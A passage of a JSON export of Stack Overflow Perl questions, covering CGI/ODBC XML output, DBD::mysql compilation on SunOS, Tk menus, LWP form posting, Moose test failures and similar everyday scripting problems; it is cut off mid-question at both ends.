spGetUserPermissionTabData '$iUser'\";\n\n$iNumRecordsRead = ReadData( -dbconnection=&gt;$db, -sqlstatement=&gt;$szSQLStatement, -datahash=&gt;\\%UserData );\n\n$szXMLString = \"&lt;Permissions&gt;\\n\";\n$szCurrentReportGroupName = \"\";\nforeach $KEY ( sort{ $a &lt;=&gt; $b } keys %UserData )\n{\n    if( $szCurrentReportGroupName ne $UserData{$KEY}{AppGroupName} )\n    {\n        if( $szCurrentReportGroupName ne \"\" )   #Close any previous report groups\n        {\n            $szXMLString .= \"\\t&lt;/REPORTGROUP&gt;\\n\";\n        }\n        $szXMLString .= \"\\t&lt;REPORTGROUP&gt;\\n\" .\n                \"\\t\\t&lt;REPORTGROUPNAME&gt;$UserData{$KEY}{AppGroupName}&lt;/REPORTGROUPNAME&gt;\\n\" .\n                \"\\t\\t&lt;REPORTGROUPID&gt;$UserData{$KEY}{ApplicationGroupID}&lt;/REPORTGROUPID&gt;\\n\";\n        $szCurrentReportGroupName = $UserData{$KEY}{AppGroupName};\n    }\n    $szXMLString .= \"\\t&lt;REPORT&gt;\\n\" .\n            \"\\t\\t&lt;REPORTNAME&gt;$UserData{$KEY}{AppDisplayName}&lt;/REPORTNAME&gt;\\n\" .\n            \"\\t\\t&lt;REPORTID&gt;$UserData{$KEY}{ApplicationID}&lt;/REPORTID&gt;\\n\" .\n            \"\\t\\t&lt;PERMISSION&gt;$UserData{$KEY}{PermissionType}&lt;/PERMISSION&gt;\\n\" .\n            \"\\t&lt;/REPORT&gt;\\n\";\n}\n$szXMLString .= \"\\t&lt;/REPORTGROUP&gt;\\n\" .\n        \"&lt;/Permissions&gt;\";\n\nprint TMP \"UserID = $szUser\\n\";\nprint TMP \"XML = $szXMLString\\n\";\nprint TMP \"Size of XML = \" . length( $szXMLString ) . \"\\n\";\nclose $TMP;\n\nprint \"Content-Type: text/html\\n\\n\";\nprint \"$szXMLString\";\n\n\nsub OpenConnection()\n{\n    my( $szDSN ) = @_;\n    my $db = new Win32::ODBC( $szDSN );\n\n    if( !defined $db )\n    {\n        my $szLocalTime = localtime();\n\n        $szHTMLString = header;\n        $szHTMLString .= \"Error creating ODBC connection\\n\";\n        $szHTMLString .= \"&lt;BR&gt;Time: $szLocalTime\\n\";\n        $szHTMLString .= end_html();\n\n        print $szHTMLString;\n\n        return NULL;\n    }\n    return $db;\n}\n\nsub ReadData()\n{\n    my ( %fnArgs ) = @_;\n    my $szSQLStatement  = $fnArgs{-sqlstatement};\n    my $cDBConnection   = $fnArgs{-dbconnection};\n    local( *DataHash )  = $fnArgs{-datahash};\n\n    my $iRowID = 0;\n    if ($cDBConnection-&gt;Sql($szSQLStatement))\n    {\n        print \"SQL failed. Error: \" . $cDBConnection-&gt;Error() . \"\\n\";\n        $cDBConnection-&gt;Close();\n        exit;\n    }\n    while($cDBConnection-&gt;FetchRow())\n    {\n        $DataHash{$iRowID++} = {$cDBConnection-&gt;DataHash()};\n    }\n\n    return $iRowID;\n}\n\nsub XMLizer\n{\n    local ( *DataHash ) = @_;\n\n\n    my $szXMLString = \"\";\n    foreach $KEY ( keys %DataHash )\n    {\n        $szXMLString .= \"\\t&lt;\" . $KEY . \"&gt;\" . $DataHash{$KEY} . \"&lt;/\" . $KEY . \"&gt;\\n\";\n    }\n\n    return $szXMLString;\n}\n</code></pre>\n\n<p>It now looks like if we change the SQL statement in the perl file to <code>$szSQLStatement = \"EXEC spGetUserPermissionTabData 464\";</code> it will populate the assigned window with that specific users reports, even if that user is not select(expected). we now think that maybe the Perl file isnt recieving the iUserID that the Javascript is sending to it</p>\n"},{"tags":["perl","gnome","sudo","dbus","gconf"],"answer_count":3,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":1098,"score":4,"question_id":3875715,"title":"How can I run a Perl script as root yet still affect user gconf settings","body":"<p>THE NEW QUERY: I am trying to make a unified script that initializes a new Ubuntu install to my liking, it must be run under sudo to install packages, but using gconftool-2 to affect gconf setting relies on the dbus session which is not handled properly by the method of simply changing UID in the script alone. Does someone know how to manage to do this?</p>\n\n<p>OLD QUERY: I am writing a Perl script to be executed on first boot of a new Ubuntu install. This is to ease adding repositories, installing packages, and setting gconf settings. My problem is permissions. To install packages I need the script to be executed as sudo, but then the gconftool-2 call act on the root user and not on my personal user.</p>\n"},{"tags":["perl","solaris","perl-module","dbd","sunos"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":95,"score":1,"question_id":12300465,"title":"Compiling DBD::mysql on SunOS 5.10","body":"<p>everybody</p>\n\n<p>I apologize for the massive length of this post.<br>\nI am having some issues compiling DBD::mysql on SunOS. </p>\n\n<pre><code># /usr/perl5/bin/perlgcc Makefile.PL\n\nI will use the following settings for compiling and testing:\n\n  cflags        (mysql_config) = -I/usr/sfw/include/mysql -xstrconst -mt\n  embedded      (mysql_config) = \n  ldflags       (mysql_config) = -R/usr/sfw/lib -R/usr/sfw/lib/mysql\n  libs          (mysql_config) = -L/usr/sfw/lib -L/usr/sfw/lib/mysql -lmysqlclient -lz -lposix4 -lcrypt -lgen -lsocket -lnsl -lm\n  mysql_config  (guessed     ) = mysql_config\n  nocatchstderr (default     ) = 0\n  nofoundrows   (default     ) = 0\n  ssl           (guessed     ) = 0\n  testdb        (default     ) = test\n  testhost      (default     ) = \n  testpassword  (default     ) = \n  testsocket    (default     ) = \n  testuser      (guessed     ) = \n\nChecking if your kit is complete...\nLooks good\nUsing DBI 1.58 (for perl 5.008004 on sun4-solaris-64int) installed in /usr/perl5/vendor_perl/5.8.4/sun4-solaris-64int/auto/DBI/\nWriting Makefile for DBD::mysql\n\n# /usr/sfw/bin/gmake\ncp lib/DBD/mysql.pm blib/lib/DBD/mysql.pm\ncp lib/DBD/mysql/GetInfo.pm blib/lib/DBD/mysql/GetInfo.pm\ncp lib/DBD/mysql/INSTALL.pod blib/lib/DBD/mysql/INSTALL.pod\ncp lib/Bundle/DBD/mysql.pm blib/lib/Bundle/DBD/mysql.pm\ngcc -c  -I/usr/perl5/vendor_perl/5.8.4/sun4-solaris-64int/auto/DBI -I/usr/sfw/include/mysql -xstrconst -mt -DDBD_MYSQL_INSERT_ID_IS_GOOD -g  -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -D_TS_ERRNO -O2 -fno-strict-aliasing   -DVERSION=\\\"4.022\\\" -DXS_VERSION=\\\"4.022\\\" -fPIC \"-I/usr/perl5/5.8.4/lib/sun4-solaris-64int/CORE\"   dbdimp.c\ngcc: language strconst not recognized\ngcc: dbdimp.c: linker input file unused because linking not done\n/usr/perl5/5.8.4/bin/perl -p -e \"s/~DRIVER~/mysql/g\" /usr/perl5/vendor_perl/5.8.4/sun4-solaris-64int/auto/DBI/Driver.xst &gt; mysql.xsi\n/usr/perl5/5.8.4/bin/perl /usr/perl5/5.8.4/lib/ExtUtils/xsubpp  -typemap /usr/perl5/5.8.4/lib/ExtUtils/typemap  mysql.xs &gt; mysql.xsc &amp;&amp; mv mysql.xsc mysql.c\nWarning: duplicate function definition 'do' detected in mysql.xs, line 242\nWarning: duplicate function definition 'rows' detected in mysql.xs, line 752\ngcc -c  -I/usr/perl5/vendor_perl/5.8.4/sun4-solaris-64int/auto/DBI -I/usr/sfw/include/mysql -xstrconst -mt -DDBD_MYSQL_INSERT_ID_IS_GOOD -g  -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -D_TS_ERRNO -O2 -fno-strict-aliasing   -DVERSION=\\\"4.022\\\" -DXS_VERSION=\\\"4.022\\\" -fPIC \"-I/usr/perl5/5.8.4/lib/sun4-solaris-64int/CORE\"   mysql.c\ngcc: language strconst not recognized\ngcc: mysql.c: linker input file unused because linking not done\nRunning Mkbootstrap for DBD::mysql ()\nchmod 644 mysql.bs\nrm -f blib/arch/auto/DBD/mysql/mysql.so\nLD_RUN_PATH=\"/usr/sfw/lib:/usr/lib:/lib\" /usr/perl5/5.8.4/bin/perl myld gcc  -G dbdimp.o mysql.o  -o blib/arch/auto/DBD/mysql/mysql.so   -L/usr/sfw/lib -L/usr/sfw/lib/mysql -lmysqlclient -lz -lposix4 -lcrypt -lgen -lsocket -lnsl -lm   \ngcc: dbdimp.o: No such file or directory\ngcc: mysql.o: No such file or directory\ngmake: *** [blib/arch/auto/DBD/mysql/mysql.so] Error 1\n</code></pre>\n\n<p>Probably relevant information:</p>\n\n<pre><code>mysql_config --cflags\n-I/usr/sfw/include/mysql -xstrconst -mt\n\nmysql_config --libs\n-R/usr/sfw/lib -R/usr/sfw/lib/mysql -L/usr/sfw/lib -L/usr/sfw/lib/mysql -lmysqlclient -lz -lposix4 -lcrypt -lgen -lsocket -lnsl -lm\n\nfile `which perl`\n/usr/bin/perl:  ELF 32-bit MSB executable SPARC Version 1, dynamically linked, stripped\n\n# perl --version\nThis is perl, v5.8.4 built for sun4-solaris-64int\n\nldd /usr/sfw/bin/mysql\n    libcurses.so.1 =&gt;        /lib/libcurses.so.1\n    libmysqlclient.so.12 =&gt;  /usr/sfw/lib/libmysqlclient.so.12\n    libz.so.1 =&gt;                     /usr/lib/libz.so.1\n    librt.so.1 =&gt;                    /lib/librt.so.1\n    libcrypt_i.so.1 =&gt;       /usr/lib/libcrypt_i.so.1\n    libgen.so.1 =&gt;                   /lib/libgen.so.1\n    libsocket.so.1 =&gt;        /lib/libsocket.so.1\n    libnsl.so.1 =&gt;                   /lib/libnsl.so.1\n    libm.so.2 =&gt;                     /lib/libm.so.2\n    libCstd.so.1 =&gt;                  /usr/lib/libCstd.so.1\n    libCrun.so.1 =&gt;                  /usr/lib/libCrun.so.1\n    libw.so.1 =&gt;                     /lib/libw.so.1\n    libthread.so.1 =&gt;        /lib/libthread.so.1\n    libc.so.1 =&gt;                     /lib/libc.so.1\n    libaio.so.1 =&gt;                   /lib/libaio.so.1\n    libmd.so.1 =&gt;                    /lib/libmd.so.1\n    libmp.so.2 =&gt;                    /lib/libmp.so.2\n    libscf.so.1 =&gt;                   /lib/libscf.so.1\n    libdoor.so.1 =&gt;                  /lib/libdoor.so.1\n    libuutil.so.1 =&gt;         /lib/libuutil.so.1\n    /usr/lib/cpu/sparcv8plus/libCstd_isa.so.1\n    /platform/SUNW,SPARC-Enterprise-T5120/lib/libc_psr.so.1\n    /platform/SUNW,SPARC-Enterprise-T5120/lib/libmd_psr.so.1\n\n# perl -V\nSummary of my perl5 (revision 5 version 8 subversion 4) configuration:\n  Platform:\n    osname=solaris, osvers=2.10, archname=sun4-solaris-64int\n    uname='sunos localhost 5.10 sun4u sparc SUNW,Ultra-2'\n    config_args=''\n    hint=recommended, useposix=true, d_sigaction=define\n    usethreads=undef use5005threads=undef useithreads=undef usemultiplicity=undef\n    useperlio=define d_sfio=undef uselargefiles=define usesocks=undef\n    use64bitint=define use64bitall=undef uselongdouble=undef\n    usemymalloc=n, bincompat5005=undef\n  Compiler:\n    cc='cc', ccflags ='-D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -xarch=v8 -D_TS_ERRNO',\n    optimize='-xO3 -xspace -xildoff',\n    cppflags=''\n    ccversion='Sun WorkShop', gccversion='', gccosandvers=''\n    intsize=4, longsize=4, ptrsize=4, doublesize=8, byteorder=87654321\n    d_longlong=define, longlongsize=8, d_longdbl=define, longdblsize=16\n    ivtype='long long', ivsize=8, nvtype='double', nvsize=8, Off_t='off_t', lseeksize=8\n    alignbytes=8, prototype=define\n  Linker and Libraries:\n    ld='cc', ldflags =''\n    libpth=/lib /usr/lib /usr/ccs/lib\n    libs=-lsocket -lnsl -ldl -lm -lc\n    perllibs=-lsocket -lnsl -ldl -lm -lc\n    libc=/lib/libc.so, so=so, useshrplib=true, libperl=libperl.so\n    gnulibc_version=''\n  Dynamic Linking:\n    dlsrc=dl_dlopen.xs, dlext=so, d_dlsymun=undef, ccdlflags='-R /usr/perl5/5.8.4/lib/sun4-solaris-64int/CORE'\n    cccdlflags='-KPIC', lddlflags='-G'\n\n\nCharacteristics of this binary (from libperl): \n  Compile-time options: USE_64_BIT_INT USE_LARGE_FILES\n  Locally applied patches:\n        22667 The optree builder was looping when constructing the ops ...\n        22715 Upgrade to FileCache 1.04\n        22733 Missing copyright in the README.\n        22746 fix a coredump caused by rv2gv not fully converting a PV ...\n        22755 Fix 29149 - another UTF8 cache bug hit by substr.\n        22774 [perl #28938] split could leave an array without ...\n        22775 [perl #29127] scalar delete of empty slice returned garbage\n        22776 [perl #28986] perl -e \"open m\" crashes Perl\n        22777 add test for change #22776 (\"open m\" crashes Perl)\n        22778 add test for change #22746 ([perl #29102] Crash on assign ...\n        22781 [perl #29340] Bizarre copy of ARRAY make sure a pad op's ...\n        22796 [perl #29346] Double warning for int(undef) and abs(undef) ...\n        22818 BOM-marked and (BOMless) UTF-16 scripts not working\n        22823 [perl #29581] glob() misses a lot of matches\n        22827 Smoke [5.9.2] 22818 FAIL(F) MSWin32 WinXP/.Net SP1 (x86/1 cpu)\n        22830 [perl #29637] Thread creation time is hypersensitive\n        22831 improve hashing algorithm for ptr tables in perl_clone: ...\n        22839 [perl #29790] Optimization busted: '@a = \"b\", sort @a' ...\n        22850 [PATCH] 'perl -v' fails if local_patches contains code snippets\n        22852 TEST needs to ignore SCM files\n        22886 Pod::Find should ignore SCM files and dirs\n        22888 Remove redundant %SIG assignments from FileCache\n        23006 [perl #30509] use encoding and \"eq\" cause memory leak\n        23074 Segfault using HTML::Entities\n        23106 Numeric comparison operators mustn't compare addresses of ...\n        23320 [perl #30066] Memory leak in nested shared data structures ...\n        23321 [perl #31459] Bug in read()\n        27722 perlio.c breaks on Solaris/gcc when &gt; 256 FDs are available\n        SPRINTF0 - fixes for sprintf formatting issues - CVE-2005-3962\n        6663288 Upgrade to CGI.pm 3.33\n        REGEXP0 - fix for UTF-8 recoding in regexps - CVE-2007-5116\n        6758953 Perl Sys::Syslog can log messages with wrong severity\n  Built under solaris\n  Compiled at May 21 2009 03:59:02\n  @INC:\n    /usr/perl5/5.8.4/lib/sun4-solaris-64int\n    /usr/perl5/5.8.4/lib\n    /usr/perl5/site_perl/5.8.4/sun4-solaris-64int\n    /usr/perl5/site_perl/5.8.4\n    /usr/perl5/site_perl\n    /usr/perl5/vendor_perl/5.8.4/sun4-solaris-64int\n    /usr/perl5/vendor_perl/5.8.4\n    /usr/perl5/vendor_perl\n    .\n\nisainfo -v\n64-bit sparcv9 applications\n        asi_blk_init vis2 vis \n32-bit sparc applications\n        asi_blk_init vis2 vis v8plus div32 mul32    \n</code></pre>\n\n<p>Any tips as how I should proceed, if possible in a step-by-step (for dummies) manner?</p>\n\n<p>Thanks!</p>\n"},{"tags":["perl","r","hash","data.table"],"answer_count":5,"favorite_count":4,"up_vote_count":13,"down_vote_count":0,"view_count":2168,"score":13,"question_id":3470447,"title":"In R, can I use a list as a hash? If so, why is it so slow?","body":"<p>Before using R, I used quite a bit of Perl. In Perl, I would often use hashes, and lookups of hashes are generally regarded as fast in Perl.</p>\n\n<p>For example, the following code will populate a hash with up to 10000 key/value pairs, where the keys are random letters and the values are random integers. Then, it does 10000 random lookups in that hash.</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\n\nmy @letters = ('a'..'z');\n\nprint @letters . \"\\n\";\nmy %testHash;\n\nfor(my $i = 0; $i &lt; 10000; $i++) {\n    my $r1 = int(rand(26));\n    my $r2 = int(rand(26));\n    my $r3 = int(rand(26));\n    my $key = $letters[$r1] . $letters[$r2] . $letters[$r3];\n    my $value = int(rand(1000));\n    $testHash{$key} = $value;\n}\n\nmy @keyArray = keys(%testHash);\nmy $keyLen = scalar @keyArray;\n\nfor(my $j = 0; $j &lt; 10000; $j++) {\n    my $key = $keyArray[int(rand($keyLen))];\n    my $lookupValue = $testHash{$key};\n    print \"key \" .  $key . \" Lookup $lookupValue \\n\";\n}\n</code></pre>\n\n<p>Now that increasingly, I am wanting to have a hash-like data structure in R. The following is the equivalent R code:</p>\n\n<pre><code>testHash &lt;- list()\n\nfor(i in 1:10000) {\n  key.tmp = paste(letters[floor(26*runif(3))], sep=\"\")\n  key &lt;- capture.output(cat(key.tmp, sep=\"\"))\n  value &lt;- floor(1000*runif(1))\n  testHash[[key]] &lt;- value\n}\n\nkeyArray &lt;- attributes(testHash)$names\nkeyLen = length(keyArray);\n\nfor(j in 1:10000) {\n  key &lt;- keyArray[floor(keyLen*runif(1))]\n  lookupValue = testHash[[key]]\n  print(paste(\"key\", key, \"Lookup\", lookupValue))\n}\n</code></pre>\n\n<p>The code seem to be doing equivalent things. However, the Perl one is much faster:</p>\n\n<pre><code>&gt;time ./perlHashTest.pl\nreal    0m4.346s\nuser    **0m0.110s**\nsys 0m0.100s\n</code></pre>\n\n<p>Comparing to R:</p>\n\n<pre><code>time R CMD BATCH RHashTest.R\n\nreal    0m8.210s\nuser    **0m7.630s**\nsys 0m0.200s\n</code></pre>\n\n<p>What explains the discrepancy? Are lookups in R lists just not good?</p>\n\n<p>Increasing to 100,000 list length and 100,000 lookups only exaggerates the discrepancy? Is there a better alternative for the hash data structure in R than the native list()?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":65,"score":-1,"question_id":12298103,"title":"Perl: Perl one-liner within a program on Windows ","body":"<p>My following perl one-liner throws up the error \"Use of uninitialized value $1 in concatenation (.) or string\"</p>\n\n<pre><code>`perl -pi.bak -e \"if(!/#/){s/ PERFORM ([\\\\w*-]+)\\.?/qq(#  PERFORM $1.\\n) . q($hash{$1})/eg;}\" TestFinal.txt`;\n</code></pre>\n\n<p>Thanks in Advance,\nFaez</p>\n"},{"tags":["windows","perl"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":95,"score":2,"question_id":12293751,"title":"Perl does not receive command line arguments?","body":"<p>Ive just gotten a new computer at work and Im trying to get perl up and running on it. I have a problem with Perl not reading command line input when I execute the script.</p>\n\n<p>I use Win7 and if I call the script from the command line like this:</p>\n\n<pre><code>myscript.pl 1 2 3\n</code></pre>\n\n<p>It does not receive the supplied 1 2 3, but if I call it like this:</p>\n\n<pre><code>perl myscript.pl 1 2 3\n</code></pre>\n\n<p>It does.</p>\n\n<p>This first example worked for me before and all of the scripts that we use at work calls perl scripts like that.</p>\n\n<pre><code>assoc .pl \n</code></pre>\n\n<p>gives me </p>\n\n<pre><code>.pl=Perl\n</code></pre>\n\n<p>and \n    ftype perl </p>\n\n<p>gives me </p>\n\n<pre><code>perl=C:\\Perl64\\Bin\\perl.exe \"%1\" %*\n</code></pre>\n\n<p>Any ideas?</p>\n"},{"tags":["perl","bash","range"],"answer_count":7,"favorite_count":0,"up_vote_count":5,"down_vote_count":2,"view_count":6716,"score":3,"question_id":597497,"title":"How can I compare a number against a range in bash or Perl?","body":"<p>How to script a comparison of a number against a range?</p>\n\n<blockquote>\n  <p>1 is not within 2-5</p>\n</blockquote>\n\n<p>or</p>\n\n<blockquote>\n  <p>3 is within 2-5</p>\n</blockquote>\n"},{"tags":["perl","expect"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":12272191,"title":"perl expect running 30 commands remotely","body":"<p>following loop does not produce the output IF I do not have the last exp->expect(5) line (kind of sleep). I guess this is because the loop is running 'too fast' for the 'sent' command to finish. How can i make sure the next command is run only when previous one is finished?  I am collecting output in log file.</p>\n\n<p>any advice, pl.</p>\n\n<p>ty.</p>\n\n<pre><code>use Expect;\n...\n...\nforeach my $cmd (@cmd_array){\n$exp-&gt;expect(3,\n    [ qr/($|#)/ =&gt; sub { shift-&gt;send(\"$cmd\");}]\n       );\nexp-&gt;expect(5);\n}\n</code></pre>\n"},{"tags":["perl","lwp","lwp-useragent","way2sms"],"answer_count":6,"favorite_count":4,"up_vote_count":7,"down_vote_count":0,"view_count":543,"score":7,"question_id":12128770,"title":"Automating sms sending by through Way2sms in Perl","body":"<p>I am trying to send sms through Way2sms using Perl LWP. The login part is being successful, after which I save the cookies to a local file. The welcome page after being logged in shows a <strong>Send SMS</strong> link, clicking on which one is redirected to another page with two inputs for mobile number and sms text and a button for submitting and sending the sms. Firebug reveals the page structure as shown in the figure. From the Iframe url and the form's <code>action</code> attribute, I constructed the form action's absolute URL and submit the form accordingly, with the cookie stored in the file. However, the sms isn't sent. What I am doing wrong here? The code is as follows. (The <code>name</code> attributes for the two text inputs are correct, taken by observing the source code in Firebug, although that's not included in the image)</p>\n\n<pre><code>use LWP::UserAgent;\nopen f, \"&gt; way2sms.txt\";\nuse HTTP::Cookies;\nmy $cookie_jar = HTTP::Cookies-&gt;new(\nfile =&gt; \"cookies.txt\",\nautosave =&gt; 1,\n);\n\nmy $ua = LWP::UserAgent-&gt;new(\n    agent =&gt;\n      'Mozilla/5.0 (X11; Linux x86_64; rv:14.0) Gecko/20100101 Firefox/14.0.1',\n    cookie_jar =&gt; $cookie_jar,\n);\nmy $response = $ua-&gt;post(\n    'http://site2.way2sms.com/contentt/bar/Login1.action',\n    {\n        username =&gt; $user,\n        password =&gt; $pass,\n    }\n);\n\nif ( $response-&gt;is_redirect ) {\n    $response = $ua-&gt;get( $response-&gt;header('Location') );\n    print 5 if $response-&gt;decoded_content =~ /Kaustav Mukherjee/i; #prints it, showing that the login is successful\n}   \nmy $smsresp = $ua-&gt;post(\"http://site5.way2sms.com/jsp/quicksms.action\",[MobNo=&gt;$mob,textArea=&gt;'Hello World']);\n</code></pre>\n\n<p><img src=\"http://i.stack.imgur.com/RBLiC.png\" alt=\"enter image description here\"></p>\n"},{"tags":["perl","file-download"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":44,"score":2,"question_id":12296489,"title":"Perl file::fetch failed cause URL doesnt have a file","body":"<p>I am running a script that pulls URLs from a database and performs a file::fetch. From my understanding,file::fetch only works when there is really a file in the url to be downloaded. However,in my database there is the occasional url where there is no file to be fetched. So, is there any module i can use to check that there is a file in the URL i am attempting to perform a file::fetch?</p>\n\n<p>there is a line in my script </p>\n\n<pre><code>my $uri_handle = File::Fetch-&gt;new(uri =&gt; $url);\n</code></pre>\n\n<p>where the $url may be something like <code>http://asiaone.com</code> with no file to actually be fetched.\nand i get this error which i am desperately trying to avoid because there are other URL that mostly contain files to fetch.</p>\n\n<pre><code>Use of uninitialized value $path in pattern match (m//) at C:/Perl/lib/File/Spec/Unix.pm line 267.\nUse of uninitialized value in string eq at C:/Perl/lib/File/Fetch.pm line 395.\nHostname required when fetching from 'http' at C:\\test\\multihashtest2.pl line 100 thread 2\n</code></pre>\n\n<p>How can i format my regex to check for files or is there a module i can utilize to facilitate this?</p>\n\n<p>a legit URL would be something like below\n<a href=\"http://the.earth.li/~sgtatham/putty/latest/x86/puttytel.exe\" rel=\"nofollow\">http://the.earth.li/~sgtatham/putty/latest/x86/puttytel.exe</a></p>\n"},{"tags":["linux","perl","bash","shell","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":146,"score":2,"question_id":12296308,"title":"Shell script working fine without shebang line? Why?","body":"<p>I was writing a simple shell script and found out that my shell script doesn't require shebang line</p>\n\n<pre><code>#!/bin/sh\n</code></pre>\n\n<p>If I give execute permissions to my script and execute using <code>./myscript.sh</code>. It runs fine.</p>\n\n<p>I am using <code>bash</code> shell and <code>/bin/sh</code> is actually pointing to <code>bash</code>.</p>\n\n<pre><code>lrwxrwxrwx 1 root root /bin/sh -&gt; bash\n</code></pre>\n\n<p>I know that shebang line is used to tell shell which interpreter to use for your rest of the script.</p>\n\n<p>If I miss shebang line in perl, give execute permissions and run <code>./myscript.pl</code>, it doesn't work.</p>\n\n<p>What's actually happening here? If I use <code>./</code>, When is shebang line actually needed?</p>\n"},{"tags":["php","javascript","python","xml","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12295834,"title":"Export a website to an XML Page","body":"<p>I need to export a website(.html page) to a XML file. The website contains a table with some data which i require for using in my web project. The table in the website is formed using some javascript, so i cannot get the data by getting the page source. Please tell me how I can export the table in the website to a XML file using php/python/javascript/perl.</p>\n"},{"tags":["perl","tk"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":376,"score":1,"question_id":6191809,"title":"Delete the subwidgets/entries from a tk::menu widget","body":"<p>I want to implement a history/recent-files functionality for my Perl/<a href=\"http://search.cpan.org/~srezic/Tk-804.029/\" rel=\"nofollow\">Tk</a> program.</p>\n\n<p>Here is a working code excerpt from my program to demonstrate my problem.</p>\n\n<pre><code>#!/usr/bin/perl \n\nuse strict;\nuse warnings;\nuse English qw( -no_match_vars );\n\nuse Tk;\n\nmy @history_entries = qw(Back To The History);\n\nmy $mw      = MainWindow-&gt;new();\nmy $menubar = $mw-&gt;Menu();\n$mw-&gt;configure( -menu =&gt; $menubar );\nmy $file    = $menubar-&gt;cascade( -label =&gt; '~File' );\nmy $history = $file-&gt;cascade( -label =&gt; '~History', );\n\nbuild_history();\n\nMainLoop();\n\n#===  FUNCTION  ================================================================\n#         NAME:  build_history\n#      PURPOSE:  Polulate the history\n#===============================================================================\nsub build_history {\n    foreach (@history_entries) {\n        $history-&gt;command(\n            -label    =&gt; $ARG,\n            -command  =&gt; \\&amp;some_function,\n            -compound =&gt; 'left',\n        );\n    }\n    return;\n}    # ----------  end of subroutine build_history  ----------\n</code></pre>\n\n<p>As you can see, the entries are created with <a href=\"http://search.cpan.org/~srezic/Tk-804.029/pod/Menu.pod#COMMAND_ENTRIES\" rel=\"nofollow\"><strong>$history->command</strong></a> but how can I delete them every time I call build_history?</p>\n\n<p>The reason I want them deleted is that everytime a user opens a file, the last item (in this case 'History') should be deleted and a new item should be put on top of the list. So that I have a maximum of (in this example) four entries.</p>\n\n<p>Any other ways of implementing this functionality with Tk are welcome.</p>\n\n<p>Thanks for your time.</p>\n\n<p><strong>UPDATE</strong>:\nI followed the advice of \"mu\" and tried to get the subwidgets with the children() function just after the function is called, like this:</p>\n\n<pre><code>my @child = $history-&gt;children();\nforeach my $c ( @child ) {\n    if ($c-&gt;Exists()){\n        $c-&gt;destroy;\n    }\n}\n</code></pre>\n\n<p>The program exits with the error:</p>\n\n<pre><code>Can't locate object method \"children\" via package \"Tk::Menu::Cascade\" at /home/alex/Desktop/stack_history.pl line 28.\n</code></pre>\n"},{"tags":["perl","shell","unix","sed","awk"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":110,"score":4,"question_id":12287162,"title":"Lowercase to Uppercase of character in Shell Scripting","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12210568/character-lowercase-to-uppercase-in-shell-scripting\">Character Lowercase to Uppercase in Shell Scripting</a>  </p>\n</blockquote>\n\n\n\n<p>I have value as: <code>james,adam,john</code> I am trying to make it <code>James,Adam,John</code> (First character of each name should be Uppercase).</p>\n\n<pre><code>echo 'james,adam,john' | sed 's/\\&lt;./\\u&amp;/g'\n</code></pre>\n\n<p>is not working in all the systems. In one system its showing ok..but not ok in another system...</p>\n\n<pre><code>A=\"james adam john\"\nB=( $A )\necho \"${B[@]^}\"\n</code></pre>\n\n<p>its throwing some syntax error...So, i am doing it through a long query sing while loop, which is too lengthy.\nIs there any shortcut way to do this?</p>\n"},{"tags":["perl","testing","moose"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":57,"score":2,"question_id":12277113,"title":"Moose Test Failures","body":"<p>I'm trying to upgrade to the latest version of Moose and I am getting many test failures.</p>\n\n<p>All of these errors appear related to metaclasses. I have also tried to install 2.0402 (that's what we have on our local mirror) and get the same errors. For example:</p>\n\n<pre><code>t/cmop/rebless_with_extra_params.t ............................ \n   Foo already has a metaclass, but it does not inherit Moose::Meta::Class\n   (Class::MOP::Class=HASH(0x2be2070)). \n   at /home/cpoe/Downloads/Moose-2.0603/blib/lib/Moose.pm line 170.\n</code></pre>\n\n<p><a href=\"https://gist.github.com/3618458\" rel=\"nofollow\">I've posted a gist of the full <code>make test</code> output</a>.</p>\n\n<p>I am doing the standard \"perl Makefile.PL; make; make test\".</p>\n\n<pre><code>$ perl -v\n\nThis is perl 5, version 12, subversion 2 (v5.12.2) built for x86_64-linux\n</code></pre>\n\n<p>If anyone can suggest where to look to solve this error, or what other information I can provide to help diagnose it? My searches on Google have turned up nothing.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":99,"score":3,"question_id":12291180,"title":"how to get the exact full path to a file in perl","body":"<p>I only have a file name which is <code>myfile.txt</code> and I am not sure where it is saved. How can i get the exact full path where the file is stored.\nI have tried </p>\n\n<pre><code>$string=`ls /abc/def/*/*/*/*/myfile.txt`;\n</code></pre>\n\n<p>Result: Full path is <code>/abc/def/ghi/jkl/mno/pqr/myfile.txt</code></p>\n\n<p>I able to get the full path by running <code>shell command</code> using perl script above. However, this took very long time to return the path. Is that any way to find the full path of the file by using perl? </p>\n"},{"tags":["perl","networking","network-programming","workaround"],"answer_count":1,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":120,"score":4,"question_id":12277256,"title":"Perl workaround for EAGAIN (Resource temporarily unavailable)?","body":"<p>I just discovered a network failure which had caused an \"EAGAIN (Resource temporarily unavailable)\" infinite loop within <code>LWP::UserAgent</code> (regardless of which module is used). I only find a brutal solution but there has to be a better, more elegant, solution out there, isn't it?</p>\n\n<p>Note: The connection is successfully established but the peer has forgotten the connection.</p>\n\n<p><strong>How to workaround <code>EAGAIN</code> infinite loops better than the following brutal solution</strong>:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse LWP::UserAgent ();\nuse HTTP::Request 